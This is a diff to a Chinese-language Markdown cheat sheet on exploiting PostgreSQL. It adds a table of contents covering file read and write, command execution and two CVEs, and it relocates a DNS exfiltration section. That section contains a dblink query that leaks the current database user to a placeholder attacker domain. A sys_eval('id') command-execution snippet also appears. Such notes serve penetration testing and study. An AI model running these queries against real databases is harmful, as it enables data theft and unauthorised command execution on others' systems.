@@ -1,3 +1,14 @@
+- [Postgresql利用](#postgresql利用)
+  - [0x01 读文件](#0x01-读文件)
+  - [0x02 写文件](#0x02-写文件)
+  - [0x03 命令执行](#0x03-命令执行)
+    - [编程语言扩展](#编程语言扩展)
+    - [低于8.2版本以下](#低于82版本以下)
+    - [大于8.2版本](#大于82版本)
+  - [0x04 DNS外带](#0x04-dns外带)
+  - [CVE-2019-9193](#cve-2019-9193)
+      - [利用条件](#利用条件)
+  - [CVE-2018-1058](#cve-2018-1058)
 # Postgresql利用
 ## 0x01 读文件
 1. 创建数据表把读到的文件copy入表
@@ -35,11 +46,6 @@ postgresql从8.3开始支持多种编程语言扩展 [链接](https://www.postgr
 ```postgresql
 select * from pg_language;
 ```
-## 0x04 DNS外带
-1. 开启dblink扩展  
-`CREATE EXTENSION dblink`  
-2. 外带语句  
-`SELECT * FROM dblink('host='||(select user)||'.f27558c1f94c0595.xxxxx.xx user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT);`
 ### 低于8.2版本以下
 可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6
 ```sql
@@ -114,6 +120,11 @@ select sys_eval('id');
 
 drop function sys_eval;
 ```
+## 0x04 DNS外带
+1. 开启dblink扩展  
+`CREATE EXTENSION dblink`  
+2. 外带语句  
+`SELECT * FROM dblink('host='||(select user)||'.f27558c1f94c0595.xxxxx.xx user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT);`
 ## CVE-2019-9193
 
 #### 利用条件
